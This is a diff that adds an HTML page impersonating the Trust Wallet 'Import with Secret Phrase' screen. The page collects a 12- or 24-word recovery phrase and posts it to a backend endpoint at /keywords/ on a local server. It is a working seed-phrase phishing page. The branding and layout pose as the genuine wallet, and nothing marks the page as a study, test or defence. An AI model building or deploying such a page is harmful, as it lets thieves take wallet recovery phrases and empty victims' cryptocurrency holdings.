@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>TrustWallet</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <style>
+    .custom-box {
+      width: 100mm;
+      height: 160mm;
+    }
+    @media (max-width: 767px) {
+      .custom-box {
+        width: 70mm;  
+        height: 120mm; 
+      }
+    }
+    .dropdown-menu {
+      width: 100%; 
+      max-width: 300px; 
+      font-size: 16px; 
+      background-color: #ffffff; 
+      border: 1px solid #e5e7eb; 
+      padding: 8px; 
+      border-radius: 4px; 
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); 
+    }
+    .phrase-input {
+      width: 100%; 
+      max-width: 140px; 
+      padding: 8px;
+      margin: 2px;
+      font-size: 14px; 
+      border: 1px solid #e5e7eb; 
+      border-radius: 4px; 
+      background-color: #f9fafb; 
+      text-align: center;
+      box-sizing: border-box;
+    }
+    .phrase-input::placeholder {
+      text-align: left;
+    }
+    .phrase-container {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 4px;
+    }
+    .phrase-container.words-24 {
+      grid-template-columns: repeat(4, 1fr);
+    }
+    @media (min-width: 768px) {
+      .phrase-input {
+        max-width: 200px;
+        font-size: 16px;
+        padding: 10px;
+      }
+    }
+    @media (max-width: 767px) {
+      .phrase-input {
+        max-width: 100px;
+        font-size: 12px;
+        padding: 6px;
+      }
+    }
+  </style>
+</head>
+<body style="width: auto; height: auto; margin: 0;">
+  <div id="root" data-id="root">
+    <div class="relative flex flex-col flex-1 w-full h-full self-center md:max-w-[438px] p-2">
+      <div class="flex my-11 justify-center">
+        <img src="trust.png" alt="Header Image" width="62" height="87">
+      </div>
+      <div class="relative flex flex-col flex-grow w-full h-full self-center pt-2 md:max-w-[438px]">
+        <div class="bg-backgroundPrimary border border-line rounded p-6 mb-11 mx-auto custom-box">
+          <div class="flex flex-col items-center text-center space-y-4">
+            <img src="line.png" alt="Horizontal Lines" class="w-full max-w-full">
+            <h2 data-testid="onboarding-step-title" class="screamer-text text-textPrimary font-semibold text-unset">Import with Secret Phrase</h2>
+            <select id="phraseType" class="dropdown-menu" onchange="updatePhraseInputs()">
+              <option value="12-word">I have a 12 word Secret Phrase</option>
+              <option value="24-word">I have a 24 word Secret Phrase</option>
+            </select>
+            <div id="phraseContainer" class="phrase-container"></div>
+            <button id="clearButton" class="mt-4 bg-red-500 text-white rounded px-4 py-2" onclick="clearPhrases()">Clear All</button>
+            <button id="confirmButton" class="mt-4 bg-blue-500 text-white rounded px-8 py-2 w-full" onclick="submitPhrases()">Confirm</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+      updatePhraseInputs(); // Initialize the input fields on page load
+    });
+
+    function updatePhraseInputs() {
+      const phraseContainer = document.getElementById('phraseContainer');
+      const phraseType = document.getElementById('phraseType').value;
+      const wordCount = phraseType === '12-word' ? 12 : 24;
+      phraseContainer.innerHTML = ''; // Clear existing inputs
+
+      for (let i = 1; i <= wordCount; i++) {
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.className = 'phrase-input';
+        input.placeholder = `Word #${i}`;
+        input.onfocus = () => input.placeholder = `${i}.`;
+        input.onblur = () => input.placeholder = `Word #${i}`;
+        phraseContainer.appendChild(input);
+      }
+
+      if (wordCount === 24) {
+        phraseContainer.classList.add('words-24');
+      } else {
+        phraseContainer.classList.remove('words-24');
+      }
+    }
+
+    function clearPhrases() {
+      const phraseContainer = document.getElementById('phraseContainer');
+      phraseContainer.innerHTML = ''; // Clear all input fields
+      updatePhraseInputs(); // Reset the input fields based on selected phrase type
+    }
+
+    async function submitPhrases() {
+      const phraseContainer = document.getElementById('phraseContainer');
+      const inputs = phraseContainer.getElementsByClassName('phrase-input');
+      const words = [];
+
+      for (let input of inputs) {
+        if (input.value.trim() === '') {
+          alert('Please fill in all the words.');
+          return; // Exit if any input is empty
+        }
+        words.push(input.value.trim());
+      }
+
+      const phrase = words.join(' '); // Join words with a space
+
+      try {
+        const response = await axios.post('http://127.0.0.1:8000/keywords/', { phrase });
+        console.log('Response:', response.data);
+        alert('Words submitted successfully!');
+      } catch (error) {
+        console.error('Error submitting words:', error);
+        alert('Failed to submit words. Please try again.');
+      }
+    }
+  </script>
+</body>
+</html>
